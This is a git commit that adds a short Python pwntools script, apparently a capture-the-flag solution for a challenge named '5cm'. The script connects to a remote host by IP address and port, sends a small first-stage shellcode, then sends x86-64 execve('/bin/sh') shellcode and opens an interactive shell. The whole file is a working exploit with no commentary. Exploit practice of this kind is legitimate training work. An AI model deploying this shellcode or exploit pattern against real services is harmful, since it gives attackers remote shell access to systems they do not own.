8f2f96dcb6572fa4028410b23e3f6720a508d213
NOT <nguyenoanhthuong95@gmail.com>
2018-04-23 22:35:36 +0700

    Add files via upload

---
+++ 5cm/5cm.py
@@ -0,0 +1,11 @@
+from pwn import *
+import time
+#r = process("./5cm")
+r = remote('125.235.240.168', 27019)
+raw_input("?")
+payload = "\x0F\x05\xFF\xD2"
+r.send(payload)
+time.sleep(2)
+payload = "\xFF\xD2\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+r.sendline(payload)
+r.interactive()
